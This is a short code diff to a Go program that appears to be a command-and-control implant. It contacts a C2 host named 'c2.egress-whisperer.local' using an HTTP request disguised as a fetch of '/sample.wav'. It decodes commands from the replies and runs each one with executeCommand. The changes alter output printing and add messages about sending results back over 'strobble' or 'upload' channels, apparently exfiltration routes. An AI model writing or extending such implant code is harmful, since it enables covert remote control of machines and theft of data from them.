@@ -32,6 +32,7 @@ type dialResult struct {
 var c2_server_ip string
 var c2_hostname ="c2.egress-whisperer.local"
 var timeout time.Duration
+var echo_to_stdout = "off"
 
 var http_request_string = "GET /sample.wav HTTP/1.1\r\n" +
            "Host: " + c2_hostname + "\r\n" +
@@ -122,7 +123,7 @@ func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- di
 					store_command = 0
 					finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
 					decoded_cmd_byte = decoded_cmd_byte[:0]
-					fmt.Println("decoded_cmd_byte = ", finalCommand)
+					fmt.Println("$>", finalCommand)
 					go executeCommand(finalCommand)
 				}
 				//fmt.Println("Debug info, fifo4 status - ", string(fifo4))
@@ -235,6 +236,13 @@ func executeCommand(finalCommand string){
 		}
 
 		formatted_out := strings.TrimSpace(string(res))
-		fmt.Println("result = ", formatted_out) 
+		if len(formatted_out)<5{
+			if echo_to_stdout=="on"{
+			fmt.Println("sending output through strobble")}
+		}else{
+			if echo_to_stdout=="on"{
+			fmt.Println("Sending output through upload")}
+		}
+		fmt.Println(formatted_out) 
 	}
 }
